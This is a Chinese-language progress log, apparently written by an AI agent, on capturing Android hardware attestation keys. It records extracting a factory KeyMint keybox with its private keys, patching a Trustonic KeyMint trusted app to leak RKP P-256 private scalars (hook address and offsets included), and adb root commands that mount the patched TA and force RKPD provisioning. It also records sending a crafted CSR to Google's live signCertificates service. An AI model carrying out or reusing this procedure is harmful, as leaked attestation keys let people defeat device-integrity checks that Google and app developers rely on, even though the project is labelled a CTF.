# 当前 CTF 目标进展：Google RKP Attestation Key Capture

> 最新更新（2026-08-15 16:41）：网络阻塞已排除，设备能访问 `remoteprovisioning.googleapis.com`。system RKPD flow 已推进到 CSR 阶段，但 `rkp_ptr196` 把原始 private handle 替换成 196B 明文对象，导致 `generateCertificateRequest` 返回 `code 5`，DB 仍为 0 条新 key。当前路线切换为 direct-only side-channel leak：保持原始 private handle 不变，只在 direct client 的大 private mapped buffer 尾部额外输出 196B keygen object。详见 `<PROJECT_ROOT>/outputdoc/10_RKP_CURRENT_PROGRESS_SNAPSHOT_20260815_164139.md`。


项目根目录：`<PROJECT_ROOT>`

记录日期：2026-08-15  
当前目标：获得 Google Remote Key Provisioning 流程下发后的 RKP attestation certificate chain，以及与该 leaf certificate 对应的明文 P-256 attestation private key，并整理为一条 RKP 一个目录、包含 XML key 的可恢复产物。

## 1. 当前结论

当前阶段已经完成三件关键工作：

1. **已确认设备 RKP 池结构有效**：RKPD DB 中已有 12 条 Google RKP provisioned key，证书链均有效，leaf certificate 公钥与 DB `public_key` 完全匹配。
2. **已定位并验证 RKP 私钥泄漏补丁点**：`rkp_ptr196` patched KeyMint TA 可以在 `GenerateEcdsaP256KeyPair` 成功返回路径泄出 196B 内部 keygen object；该 object 的 `0x98..0xb7` 为 P-256 private scalar，direct probe 已验证 scalar 推导出的公钥与当次生成的 RKP public key一致。
3. **已尝试让系统 RKPD 走 Google provisioning 并捕获新 key**：patched TA 已成功临时挂到系统 KeyMint 服务并被服务加载；RKPD job 已触发，但设备当时没有 Android default network，未能访问 `remoteprovisioning.googleapis.com`，所以这次没有拿到新的 Google cert/private-key 配对。

当前尚未完成的核心事项：**让设备连上可信网络后重跑 Google RKP provisioning，使 RKPD 写入新的 Google-signed RKP cert chain，同时通过 patched TA 把对应 private key object 写进 DB，再解析生成 XML/PEM 产物。**

## 2. 已完成工作记录

### 2.1 上一轮 factory KeyMint keybox 提取

已完成本地 TEE/factory attestation keybox 提取，产物位于：

```text
<PROJECT_ROOT>/extracted_keybox
```

关键产物：

```text
<PROJECT_ROOT>/extracted_keybox/keybox.xml
<PROJECT_ROOT>/extracted_keybox/ec_private_key.pem
<PROJECT_ROOT>/extracted_keybox/rsa_private_key.pem
<PROJECT_ROOT>/extracted_keybox/ec_cert_*.der
<PROJECT_ROOT>/extracted_keybox/rsa_cert_*.der
```

相关文档：

```text
<PROJECT_ROOT>/outputdoc/01_NECESSARY_IMPLEMENTATION_FLOW.md
<PROJECT_ROOT>/outputdoc/02_FULL_REPLAY_REPRODUCTION.md
<PROJECT_ROOT>/outputdoc/03_FULL_ANALYSIS_PROCESS_RECORD.md
<PROJECT_ROOT>/outputdoc/04_CTF_VULNERABILITY_REPORT.md
<PROJECT_ROOT>/outputdoc/06_FROM_REPO_TO_TEE_KEYBOX_EXTRACTION_GUIDE.md
```

这部分证明：上一轮目标是 factory EC/RSA attestation keybox；当前 RKP 目标是另一条动态 provisioned P-256 attestation key 路线。

### 2.2 当前设备 RKP 池 dump 与整理

已从设备 RKPD app 数据中 dump：

```text
/data/user/0/com.android.rkpdapp/databases/rkpd_database
/data/user/0/com.android.rkpdapp/databases/rkpd_database-wal
/data/user/0/com.android.rkpdapp/databases/rkpd_database-shm
/data/user_de/0/com.android.rkpdapp/shared_prefs/com.android.rkpdapp.utils.preferences.xml
```

原始取证目录：

```text
<PROJECT_ROOT>/rkp_research/current_device_dump_20260815_150725
```

整理后的 RKP dump 入口：

```text
<PROJECT_ROOT>/rkp_dumps
```

结果：

- `provisioned_keys` 共 12 条。
- 3 条已有 `client_uid/key_id` 分配记录，9 条未分配。
- 每条含：216B `key_blob`、64B P-256 raw `public_key`、4 张 DER X.509 cert chain。
- 12/12 条 leaf cert public key 与 DB `public_key` 一致。
- 12/12 条 Google RKP cert chain openssl verify OK。
- DB 中的 `key_blob` 是 Trustonic/KeyMint opaque wrapped blob，不是明文私钥。

整理格式：一条 RKP 一个目录，例如：

```text
<PROJECT_ROOT>/rkp_dumps/rkp_00_rowid1_uid1017_keyid10138/key.xml
<PROJECT_ROOT>/rkp_dumps/rkp_01_rowid2_uid1017_keyid10220/key.xml
...
<PROJECT_ROOT>/rkp_dumps/rkp_11_rowid12_uidnone_keyidnone/key.xml
```

顶层索引：

```text
<PROJECT_ROOT>/rkp_dumps/README.md
<PROJECT_ROOT>/rkp_dumps/manifest.json
<PROJECT_ROOT>/rkp_dumps/all_rkp_keys.xml
```

相关文档：

```text
<PROJECT_ROOT>/outputdoc/07_RKP_POOL_DUMP_20260815.md
```

### 2.3 对旧 direct-generated RKP key 的判断

已经确认：之前 direct client 生成/泄出的 RKP 私钥只对应当次 direct probe 的 public key，不对应 RKPD DB 里已有的 12 条 Google-signed leaf certificate。

原因：RKPD DB 里的 12 条证书是之前系统与 Google RKP server 通讯后获得的 provisioned keys；direct probe 只是本地直接调用 `IRemotelyProvisionedComponent.generateEcdsaP256KeyPair` 类似路径生成的新 key。两者 keypair 不同，不能把 direct probe 的 private scalar 套到旧 Google cert 上。

因此正确目标变为：**让系统 RKPD 重新走 Google provisioning 流程，并在这一次生成 keypair 时同步泄出 private scalar。**

### 2.4 `rkp_ptr196` patched TA

补丁脚本：

```text
<PROJECT_ROOT>/rkp_research/patch_0706_rkp_ptr196.py
```

patched TA：

```text
<PROJECT_ROOT>/patched_ta/0706000000000000000000000000004d.rkp_ptr196.tlbin
<PROJECT_ROOT>/patched_ta/0706000000000000000000000000004e.rkp_ptr196.tlbin
```

验证目录：

```text
<PROJECT_ROOT>/rkp_research/rkptee_out_ptr196_verify/rkptee_out
```

技术结论：

- 目标 TA：Trustonic teeKeymint v2.0。
- 目标 command：`0x00050401` / `GenerateEcdsaP256KeyPair`。
- Hook 位置：成功返回路径附近 `0x21fe0`。
- 内部 keygen object 指针：handler 栈上的 `[sp,#216]`。
- 泄漏对象长度：196B。
- private scalar 偏移：`0x98`，长度 32B。
- direct probe 验证：`scalar * P-256-G == 当次 generated public key`。

### 2.5 Google RKP provisioning capture 尝试

本次运行目录：

```text
<PROJECT_ROOT>/rkp_research/google_rkp_keydump_20260815_153635
```

已执行动作：

1. 备份 RKPD app 数据。
2. push patched system UUID TA 到 `/data/local/tmp/km_rkp_ptr196_4d.tlbin`。
3. 临时 bind mount 到：

```text
/vendor/app/mcRegistry/0706000000000000000000000000004d.tlbin
```

4. 重启 `vendor.keymint-trustonic`。
5. 验证 `cmd remote_provisioning dump` 可用。
6. 清空 RKPD DB 并触发 `com.android.rkpdapp.BootReceiver`。
7. 重新调度并 force run RKPD jobs `26/27`。
8. 拉取失败后的日志和 DB。
9. 因网络阻塞，恢复原 TA 挂载和原 RKPD DB。

关键记录：

```text
<PROJECT_ROOT>/rkp_research/google_rkp_keydump_20260815_153635/device_logs/00_baseline_and_backup.txt
<PROJECT_ROOT>/rkp_research/google_rkp_keydump_20260815_153635/device_logs/01_bindmount_patched_ta.txt
<PROJECT_ROOT>/rkp_research/google_rkp_keydump_20260815_153635/device_logs/04_wake_bootreceiver.txt
<PROJECT_ROOT>/rkp_research/google_rkp_keydump_20260815_153635/device_logs/05_force_jobs_26_27.txt
<PROJECT_ROOT>/rkp_research/google_rkp_keydump_20260815_153635/device_logs/06_connectivity_diag.txt
<PROJECT_ROOT>/rkp_research/google_rkp_keydump_20260815_153635/device_logs/11_restore_after_network_block.txt
<PROJECT_ROOT>/rkp_research/google_rkp_keydump_20260815_153635/device_logs/12_final_device_verification.txt
```

失败原因：

```text
Active default network: none
Unable to resolve host "remoteprovisioning.googleapis.com": No address associated with hostname
```

失败后状态：

- Google provisioning 没有完成。
- 失败后临时 DB 中 `provisioned_keys = 0`。
- 没有获得新的 Google cert/private-key 配对。

恢复后状态：

```text
/vendor/app/mcRegistry/0706000000000000000000000000004d.tlbin SHA256:
ad17a40a49cc0c812f78359a72d5d5c73b54eabac261f861db6d1f72b3b745b2

RKPD DB restored:
count=12, min_key_blob_len=216, max_key_blob_len=216
```

相关文档：

```text
<PROJECT_ROOT>/outputdoc/08_GOOGLE_RKP_ATTESTATION_KEY_CAPTURE_20260815.md
<PROJECT_ROOT>/rkp_research/google_rkp_keydump_20260815_153635/RECOVERY_AND_RUNBOOK.md
```

## 3. 当前阻塞点

唯一实际阻塞点是设备当时没有可用 Android default network，导致 RKPD 不能访问 Google RKP server。

需要满足：

```text
cmd connectivity airplane-mode -> disabled
dumpsys connectivity | grep "Active default network" -> 非 none
ping remoteprovisioning.googleapis.com -> 成功解析/连通
```

建议方式：

1. 在设备 UI 上连接可信 Wi-Fi；或
2. 打开已保存过的可信热点；或
3. 确认移动数据可用。

网络通后即可按 runbook 续跑，不需要重新分析补丁点。

## 4. 继续执行计划

### 4.1 设备侧续跑

前置确认：

```bash
adb shell 'su -c "
  cmd connectivity airplane-mode
  cmd wifi status
  dumpsys connectivity | grep "Active default network"
  ping -c 1 -W 3 remoteprovisioning.googleapis.com
"'
```

重新挂载 patched TA：

```bash
adb push "<PROJECT_ROOT>/rkp_research/google_rkp_keydump_20260815_153635/tools/0706000000000000000000000000004d.rkp_ptr196.tlbin" /data/local/tmp/km_rkp_ptr196_4d.tlbin
adb shell 'su -c "chmod 0644 /data/local/tmp/km_rkp_ptr196_4d.tlbin; chcon u:object_r:mobicore_vendor_file:s0 /data/local/tmp/km_rkp_ptr196_4d.tlbin"'
```

运行续跑 helper：

```bash
adb push "<PROJECT_ROOT>/rkp_research/google_rkp_keydump_20260815_153635/tools/resume_capture_after_network.sh" /data/local/tmp/resume_capture_after_network.sh
adb shell 'su -c "DEV_RUN=/data/local/tmp/google_rkp_keydump_retry sh /data/local/tmp/resume_capture_after_network.sh"'
```

### 4.2 拉取与解析

成功后拉取 retry bundle：

```bash
adb exec-out su -c 'tar -C /data/local/tmp -cf - google_rkp_keydump_retry/backup/rkpdapp_data_after_retry.tar google_rkp_keydump_retry/logs' > retry_bundle.tar
```

解析生成最终 dump：

```bash
python3 "<PROJECT_ROOT>/rkp_research/google_rkp_keydump_20260815_153635/tools/organize_google_rkp_leaked_db.py" "<PROJECT_ROOT>/rkp_research/google_rkp_keydump_20260815_153635"
```

预期输出：

```text
<PROJECT_ROOT>/rkp_research/google_rkp_keydump_20260815_153635/google_rkp_dumps/rkp_00_.../key.xml
<PROJECT_ROOT>/rkp_research/google_rkp_keydump_20260815_153635/google_rkp_dumps/rkp_00_.../attestation_private_key_pkcs8.pem
<PROJECT_ROOT>/rkp_research/google_rkp_keydump_20260815_153635/google_rkp_dumps/rkp_00_.../private_scalar.bin
<PROJECT_ROOT>/rkp_research/google_rkp_keydump_20260815_153635/google_rkp_dumps/rkp_00_.../certificate_chain.pem
```

每条 RKP 需要验证：

- `scalar * P-256-G == DB public_key`
- private key 签名可被 leaf cert public key 验证
- Google cert chain openssl verify OK
- `key.xml` 中 private key 与 certificate chain 同属同一 leaf public key

## 5. 目录地图

```text
<PROJECT_ROOT>/outputdoc/
  07_RKP_POOL_DUMP_20260815.md
  08_GOOGLE_RKP_ATTESTATION_KEY_CAPTURE_20260815.md
  09_CURRENT_CTF_RKP_PROGRESS_20260815.md

<PROJECT_ROOT>/rkp_dumps/
  README.md
  manifest.json
  all_rkp_keys.xml
  rkp_00_.../key.xml
  ...
  rkp_11_.../key.xml

<PROJECT_ROOT>/rkp_research/current_device_dump_20260815_150725/
  raw/
  parsed/
  parsed/summary.json
  parsed/row_table.md

<PROJECT_ROOT>/rkp_research/google_rkp_keydump_20260815_153635/
  RECOVERY_AND_RUNBOOK.md
  device_logs/
  raw/
  tools/
```

## 6. 成果与下一步状态

### 已有成果

- factory KeyMint keybox 已提取并验证。
- 当前设备 RKPD/RKP 池已 dump 并整理为 per-RKP 文件夹和 XML。
- Google RKP certificate chain 结构和有效性已确认。
- RKP private scalar 泄漏补丁点已验证。
- 系统级 patched TA bind mount + RKPD job trigger 路线已跑通到 Google 请求前。
- 失败后设备已恢复到原状态，可继续下一轮。

### 下一步

在设备网络正常后继续跑：

1. 检查 default network 与 DNS。
2. 重新临时挂载 `rkp_ptr196` patched TA。
3. 清空/触发 RKPD provisioning。
4. 等待 Google 返回新 RKP cert chain。
5. 拉取 RKPD DB。
6. 用 `organize_google_rkp_leaked_db.py` 解析出 `key.xml`、private scalar、PKCS#8 private key、certificate chain。
7. 验证并把结果补入本文档、`08_GOOGLE_RKP_ATTESTATION_KEY_CAPTURE_20260815.md` 和 `RECOVERY_AND_RUNBOOK.md`。

## 7. 2026-08-15 16:10 后续执行记录

### 7.1 网络前置条件已满足

16:10 前置检查：

```text
设备：<DEVICE_SERIAL> / A142 / Pacman
Wi-Fi：xnhzplus
Airplane mode：disabled
Active default network：101
remoteprovisioning.googleapis.com：ping OK
cmd remote_provisioning dump：default / Trustonic / supportedNumKeysInCsr=4
```

说明：上一轮阻塞的“无默认网络 / DNS 失败”已经解除。

### 7.2 第一次续跑：原 helper + 已恢复 DB

本次目录：

```text
<PROJECT_ROOT>/rkp_research/google_rkp_keydump_retry_20260815_161025
```

执行动作：

1. 重新 push `rkp_ptr196` patched TA。
2. 临时 bind mount 到 `/vendor/app/mcRegistry/0706000000000000000000000000004d.tlbin`。
3. 运行 `resume_capture_after_network.sh`。
4. 拉回 `device_retry_bundle.tar`。
5. 解除 patched TA 挂载并恢复 retry 前 RKPD 备份。

结果：未获得新 RKP key。失败原因不是网络，而是 RKPD app 的 WorkManager 数据库无法打开：

```text
java.lang.IllegalStateException: The file system on the device is in a bad state.
WorkManager cannot access the app's internal data store.
SQLiteCantOpenDatabaseException: Cannot open database '/data/user/0/com.android.rkpdapp/no_backup/androidx.work.workdb'
```

根因定位：从 tar 恢复 RKPD 数据后，子目录和文件 SELinux context 被恢复成：

```text
u:object_r:system_data_file:s0
```

而 RKPD app 进程上下文是：

```text
u:r:rkpdapp:s0:c512,c768
```

日志中出现 AVC：

```text
avc: denied { open/write } ... scontext=u:r:rkpdapp:s0:c512,c768 tcontext=u:object_r:system_data_file:s0
```

`restorecon -RFv` 未能修复这些子路径标签。因此这次没有进入 Google provisioning 阶段，after retry tar 内无有效 `rkpd_database` 内容。

### 7.3 第二次续跑：pm clear 方式重建 RKPD app data

为避免手工递归 `chcon`，改用更安全的方式：先备份，再 `pm clear com.android.rkpdapp`，让系统重新创建 app data、WorkManager DB 和 shared prefs。

新增 helper：

```text
<PROJECT_ROOT>/rkp_research/google_rkp_keydump_retry_pmclear_20260815_pending/tools/resume_capture_pmclear.sh
```

本次目录：

```text
<PROJECT_ROOT>/rkp_research/google_rkp_keydump_retry_pmclear_20260815_161655
```

结果：SELinux/WorkManager 问题已解决，RKPD app 能正常启动，数据目录标签变为正确的 app data label：

```text
u:object_r:privapp_data_file:s0:c512,c768
```

但是 RKP key generation 在 HAL 层失败：

```text
RkpdProvisioner: Requested number of keys for provisioning: 12
TrustonicKeymintDeviceImpl: generate_ecdsa_p256_key: Invalid session handle
RkpdSystemInterface: Failed to generate key. Failed with 1
android.os.ServiceSpecificException: (code 1)
```

本地解析：

```text
<PROJECT_ROOT>/rkp_research/google_rkp_keydump_retry_pmclear_20260815_161655/raw/data/user/0/com.android.rkpdapp/databases/rkpd_database
```

该 DB schema 已创建，但 `provisioned_keys` 行数为 0：

```text
provisioned rows = 0
```

因此本次仍未拿到 Google cert/private-key 配对。

### 7.4 第二次续跑后的设备清理状态

已执行清理脚本：

```text
<PROJECT_ROOT>/rkp_research/google_rkp_keydump_retry_pmclear_20260815_161655/tools/cleanup_original_ta_pmclear.sh
```

清理后验证：

```text
TA_HASH_AFTER_CLEANUP:
ad17a40a49cc0c812f78359a72d5d5c73b54eabac261f861db6d1f72b3b745b2

MOUNT_AFTER_CLEANUP:
无 070600 bind mount

RKPD app data context:
u:object_r:privapp_data_file:s0:c512,c768
```

说明：patched TA 已解除，系统 KeyMint TA 已回到原始 hash，RKPD app 数据目录已由 `pm clear` 重新创建，标签正确。

当前遗留状态：RKPD app 在原 TA 下也会触发 RKP provisioning，但 `generateEcdsaP256KeyPair` 仍返回 `code 1 / Invalid session handle`。这说明当前卡点转移到 Trustonic/KeyMint/RPC session 状态，而不是网络、证书解析或 RKPD 数据库权限。

### 7.5 当前新阻塞点

阻塞点：

```text
TrustonicKeymintDeviceImpl: generate_ecdsa_p256_key: Invalid session handle
TrustonicKeymintDeviceImpl: generate_certificate_request: Invalid session handle
```

已确认服务表面状态均为 running：

```text
init.svc.tee-1-1 = running
init.svc.vendor.keymint-trustonic = running
init.svc.keystore2 = running
android.hardware.security.keymint.IRemotelyProvisionedComponent/default 存在
```

但是 RKP generate/csr 仍 code 1。下一步需要重启 Trustonic/KeyMint/keystore 服务链，或直接重启设备，刷新 TEE session handle。

权限系统已拦截自动执行的服务链重启，需要人工明确授权后继续。待授权动作：

```bash
adb shell 'su -c "
  am force-stop com.android.rkpdapp || true
  stop keystore2 || true
  stop vendor.keymint-trustonic || true
  stop tee-1-1 || true
  sleep 3
  start tee-1-1 || true
  start vendor.keymint-trustonic || true
  start keystore2 || true
"'
```

授权后计划：

1. 重启 TEE/KeyMint/keystore 服务链，或重启整机。
2. 验证 `cmd remote_provisioning dump` 和 RKP key generation 是否恢复。
3. 再运行 `resume_capture_pmclear.sh`，在 patched TA 下重新触发 RKPD provisioning。
4. 如果 `provisioned_keys` 出现 196B leaked object + Google cert chain，则运行：

```bash
python3 "<PROJECT_ROOT>/rkp_research/google_rkp_keydump_retry_pmclear_20260815_161655/tools/organize_google_rkp_leaked_db.py"   "<PROJECT_ROOT>/rkp_research/google_rkp_keydump_retry_pmclear_20260815_161655"
```

并生成最终 `google_rkp_dumps/rkp_*/key.xml`。

### 7.6 16:25 最终只读核验

最终设备状态只读核验：

```text
TA_HASH:
ad17a40a49cc0c812f78359a72d5d5c73b54eabac261f861db6d1f72b3b745b2  /vendor/app/mcRegistry/0706000000000000000000000000004d.tlbin

MOUNT_CHECK:
无 070600 bind mount

RKPD app data context:
/data/user/0/com.android.rkpdapp                         u:object_r:privapp_data_file:s0:c512,c768
/data/user/0/com.android.rkpdapp/databases               u:object_r:privapp_data_file:s0:c512,c768
/data/user/0/com.android.rkpdapp/no_backup               u:object_r:privapp_data_file:s0:c512,c768
/data/user_de/0/com.android.rkpdapp                      u:object_r:privapp_data_file:s0:c512,c768
/data/user_de/0/com.android.rkpdapp/shared_prefs         u:object_r:privapp_data_file:s0:c512,c768

cmd remote_provisioning dump:
default / Trustonic / supportedNumKeysInCsr=4

cmd remote_provisioning csr default:
android.os.ServiceSpecificException: (code 1)

logcat:
TrustonicKeymintDeviceImpl: generate_certificate_request: Invalid session handle
```

结论：设备没有停留在 patched TA 状态；RKPD app data 权限/标签已正常。后续继续需要刷新 Trustonic/KeyMint RPC session。

## 2026-08-15 16:47 direct-only side-channel 补丁验证成功

新增脚本/测试：

```text
<PROJECT_ROOT>/rkp_research/test_rkp_sideleak_patch.py
<PROJECT_ROOT>/rkp_research/patch_0706_rkp_sideleak.py
<PROJECT_ROOT>/rkp_research/verify_rkp_sideleak.py
```

新增 patched TA：

```text
<PROJECT_ROOT>/patched_ta/0706000000000000000000000000004d.rkp_sideleak.tlbin
<PROJECT_ROOT>/patched_ta/0706000000000000000000000000004e.rkp_sideleak.tlbin
```

注意：`rkp_sideleak` 是 **direct-only** 补丁。它会写 `private_out + 0x400`，不能挂给 system HAL 小 buffer 使用。

验证 run：

```text
<PROJECT_ROOT>/rkp_research/direct_sideleak_20260815_164431
```

设备 direct client 输出：

```text
mcOpenTrustlet ret=0x0
[rkp_gen_prod] tci_ret=0x0 pub_len=119 priv_len=216
[rkp_gen_test] tci_ret=0x0 pub_len=125 priv_len=216
DONE rc0=0 rc1=0
```

关键结论：

- `priv_len` 已恢复为 216B，说明 stock Trustonic opaque private handle 保留，不再被 196B 明文对象替换。
- side-channel 区域 `private_full[0x400:0x400+196]` 成功输出 keygen object。
- object 起始 magic：`3c000000070000000a00001001000000`。
- `object[0x98:0xb8]` scalar 推导出的 P-256 public key 与 TA 返回的 MacedPublicKey 匹配。
- 由 scalar 生成的调试 EC private key PEM 可完成 openssl sign/verify。

摘要：

```json
[
  {
    "mode": "prod",
    "public_len": 119,
    "private_handle_len": 216,
    "private_handle_first16": "01020000ec3da19b884057babbd6db7d",
    "sideleak_object_len": 196,
    "sideleak_object_first16": "3c000000070000000a00001001000000",
    "scalar_offset": "0x98",
    "scalar_sha256": "2134d29244b3f167b4e018e721275caf92738e63e6178bbcbff10bd115099810",
    "public_xy_sha256": "f92e93f003a4ecdb683898c396547ae6c20a4eda3c80f7a2278aceb6ef82a885",
    "sideleak_object_sha256": "7262a5cd495678765abc258c7b27d7b4091c7b85cc1fbf103a7a1475637839e6",
    "private_handle_sha256": "45122fc95378548e0a7095413ad2799739b4f021f201cb6aa711d969fcc8f4b2",
    "derived_public_matches": true,
    "tci_ret": 0,
    "tci_pub_len": 119,
    "tci_priv_len": 216,
    "artifacts": {
      "object": "<PROJECT_ROOT>/rkp_research/direct_sideleak_20260815_164431/parsed/prod/rkp_sideleak_object_196.bin",
      "scalar": "<PROJECT_ROOT>/rkp_research/direct_sideleak_20260815_164431/parsed/prod/private_scalar.bin",
      "debug_xml": "<PROJECT_ROOT>/rkp_research/direct_sideleak_20260815_164431/parsed/prod/debug_key.xml",
      "debug_pem": "<PROJECT_ROOT>/rkp_research/direct_sideleak_20260815_164431/parsed/prod/debug_ec_private_key.pem",
      "stock_private_handle": "<PROJECT_ROOT>/rkp_research/direct_sideleak_20260815_164431/parsed/prod/stock_private_handle_216.bin"
    }
  },
  {
    "mode": "test",
    "public_len": 125,
    "private_handle_len": 216,
    "private_handle_first16": "01020000b317cbb89a19bfdfa7041ba5",
    "sideleak_object_len": 196,
    "sideleak_object_first16": "3c000000070000000a00001001000000",
    "scalar_offset": "0x98",
    "scalar_sha256": "3d8f1de849679a2d8efce2b9bb85a070dd232663983bb81679af519cfc52e175",
    "public_xy_sha256": "4b2fae0cb4e64b1448689ff6b518dac9d9ee509c294b896f66a36c151d5423a5",
    "sideleak_object_sha256": "5aeb14e69c6c862ee8e365b3f00bd57a866967169934fff63066ac0c473726d4",
    "private_handle_sha256": "ea48bf9ec241b38843af06aa8cad3dd2c988e7826a34847866a0fba7bc81c807",
    "derived_public_matches": true,
    "tci_ret": 0,
    "tci_pub_len": 125,
    "tci_priv_len": 216,
    "artifacts": {
      "object": "<PROJECT_ROOT>/rkp_research/direct_sideleak_20260815_164431/parsed/test/rkp_sideleak_object_196.bin",
      "scalar": "<PROJECT_ROOT>/rkp_research/direct_sideleak_20260815_164431/parsed/test/private_scalar.bin",
      "debug_xml": "<PROJECT_ROOT>/rkp_research/direct_sideleak_20260815_164431/parsed/test/debug_key.xml",
      "debug_pem": "<PROJECT_ROOT>/rkp_research/direct_sideleak_20260815_164431/parsed/test/debug_ec_private_key.pem",
      "stock_private_handle": "<PROJECT_ROOT>/rkp_research/direct_sideleak_20260815_164431/parsed/test/stock_private_handle_216.bin"
    }
  }
]
```

下一步：逆向并实现 direct `0x00050402` / `GenerateCertificateRequest` 调用，用刚刚保留下来的 216B private handle 生成 CSR blob，再继续研究 Google RKP endpoint 请求/响应。



---

## 2026-08-15 17:05:19 CST 更新：direct CSR/signCertificates 当前状态

详见快照：`<PROJECT_ROOT>/outputdoc/11_RKP_PROGRESS_SNAPSHOT_20260815_170519.md`

- 新增 `rkp_research/build_and_send_signcerts.py` 与 `rkp_research/test_build_signcerts.py`，按 RKPD 旧流程构造 `MacedKeysToSign` 与最终 `CertificateRequest`。
- `curve=2 + testMode=1` direct CSR 已确认成功：`dev_len=198`、`protected_len=433`、`maced_keys_len=32`。
- 用该 CSR 构造出的 `certificate_request.cbor` 长度为 `877`，sideleak scalar 与 public key 验证为 `true`。
- 已向 Google `v1:signCertificates` 提交，请求目录：`<PROJECT_ROOT>/rkp_research/signcerts_request_20260815_170042_send`。
- Google 返回 `HTTP 400 Bad Request`，错误：`Invalid request payload: Failed to verify certificate chain`。
- 额外复测 `4d` production key + Google curve2：TA CSR 返回 `0xfffe795b` / signed `-100005`，未得到 production CSR。
- 已完成 `ProtectedData` recipient EEK 公钥逐字节核对：Google curve2 EEK 公钥 X 为 `be85e746c4a3425a40d9363aa615d02c587e3ddc330232d2fc5e1e87255f7260`，CSR recipient 公钥 X 为 `567a10a2060dcd3f566083d5af4756664997eff8ea5362a1b29df6336878c01d`，`match=false`。
- 因此当前确定问题不是“没有 EEK”，而是 TA 输出的 `ProtectedData` 没有使用传入的 Google curve2 EEK；这与 `testMode=1` 及 `USING EEK ROOT KEY FROM VTS` 的测试/VTS EEK-root 分流相符。
- 更正：此前“ProtectedData recipient 已匹配 Google curve2 EEK”的判断错误；此前关于去掉 URL Base64 padding 的判断也已撤回，当前脚本的 URL-safe Base64 保留 padding 与 RKPD flags=10 一致。
- 下一步重点：确认 TA 在 test mode 下实际 EEK 来源，并继续定位 production mode `-100005`，不能再把当前 400 归因于 CBOR 外层结构错误。
